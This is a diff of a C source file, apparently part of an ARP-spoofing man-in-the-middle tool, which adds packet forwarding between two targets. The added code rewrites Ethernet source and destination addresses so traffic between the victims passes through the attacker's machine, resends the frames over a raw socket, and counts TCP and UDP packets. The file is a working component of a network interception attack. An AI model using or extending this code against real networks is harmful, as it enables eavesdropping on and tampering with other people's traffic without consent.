@@ -1,37 +1,63 @@
 #include <stdio.h>
-#include <pcap/pcap.h>
-#include <netinet/ip.h>
+#include <pcap/pcap.h> // for pcap_pkthdr
+#include <netinet/ip.h> // for IPPROTO_TCP IPPROTO_UDP
+#include <string.h> // for memcmp
+#include <stdlib.h> // for exit
+#include <errno.h> // for errno strerror
+#include <unistd.h> // for usleep
 #include "header.h"
 #include "packet_forward.h"
 
-int tcp_packet_count = 0;
-int udp_packet_count = 0;
+int count_tcp = 0;
+int count_udp = 0;
+
+static void change_ethernet_address(const u_char *packet, struct spoofing_attack *spoofing_attack) {
+
+	struct ethernet_header *eth_header = (struct ethernet_header*)packet;
+	
+	if (memcmp(spoofing_attack->target1_ethernet_address, eth_header->source, ETH_ALEN) == 0) {
+		memcpy(eth_header->source, spoofing_attack->man_in_the_middle_eth_address, ETH_ALEN);
+		memcpy(eth_header->destination, spoofing_attack->target2_ethernet_address, ETH_ALEN);
+	}
+
+	if (memcmp(spoofing_attack->target2_ethernet_address, eth_header->source, ETH_ALEN) == 0) {
+		memcpy(eth_header->source, spoofing_attack->man_in_the_middle_eth_address, ETH_ALEN);
+		memcpy(eth_header->destination, spoofing_attack->target1_ethernet_address, ETH_ALEN);
+	}
+}
+
+static void forwarding(const u_char *packet, struct spoofing_attack *spoofing_attack) {
+	
+	struct sockaddr sockaddr;
+	strncpy(sockaddr.sa_data, spoofing_attack->interface_name, sizeof(sockaddr.sa_data));
+
+	// TODO: Set Packet size.
+	if(sendto(spoofing_attack->send_socket, packet, 1500, 0, &sockaddr, sizeof(sockaddr)) < 0) {
+		printf("\nFailed to send forwarding : %s\n", strerror(errno));
+		return;
+	}
+}
+
+static void packet_count(const u_char *packet) {
+
+	struct ip_header *ip_hdr = (struct ip_header*)(packet + 14);
+	switch(ip_hdr->protocol) {
+		case IPPROTO_TCP: count_tcp += 1; break;
+		case IPPROTO_UDP: count_udp += 1; break;
+	}
+	printf("\rTCP: %d Packet , UDP: %d Packet", count_tcp, count_udp);
+}
 
 void forward(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
 
-	struct spoofing_attack *spoofing_attack = (struct spoofing_attack*) args;
+	struct spoofing_attack *spoofing_attack = (struct spoofing_attack*)args;	
 
-	// for debug
-	printf("args -> target1_ethernet_address [%02x:%02x:%02x:%02x:%02x:%02x]\n",
-		spoofing_attack->target1_ethernet_address[0], spoofing_attack->target1_ethernet_address[1], spoofing_attack->target1_ethernet_address[2],
-		spoofing_attack->target1_ethernet_address[3], spoofing_attack->target1_ethernet_address[4], spoofing_attack->target1_ethernet_address[5]);
+	packet_count(packet);
 
-	printf("args -> target2_ethernet_address [%02x:%02x:%02x:%02x:%02x:%02x]\n",
-		spoofing_attack->target2_ethernet_address[0], spoofing_attack->target2_ethernet_address[1], spoofing_attack->target2_ethernet_address[2],
-		spoofing_attack->target2_ethernet_address[3], spoofing_attack->target2_ethernet_address[4], spoofing_attack->target2_ethernet_address[5]);	
-	
-	printf("args -> interface_name [%s]\n", spoofing_attack->interface_name);
+	change_ethernet_address(packet, spoofing_attack);
 
-	struct ethernet_header *eth_header = (struct ethernet_header*)packet;
-	struct ip_header *ip_hdr = (struct ip_header*)(packet + 14);
+	forwarding(packet, spoofing_attack);
 
-	if(ip_hdr->protocol == IPPROTO_TCP) {
-		tcp_packet_count += 1;
-	}
-
-	if(ip_hdr->protocol == IPPROTO_UDP) {
-		udp_packet_count += 1;
-	}
-
-	printf("\rTCP: %d Packet , UDP: %d Packet", tcp_packet_count, udp_packet_count);
+	// To avoid No buffer space available Error.
+	usleep(100);
 }
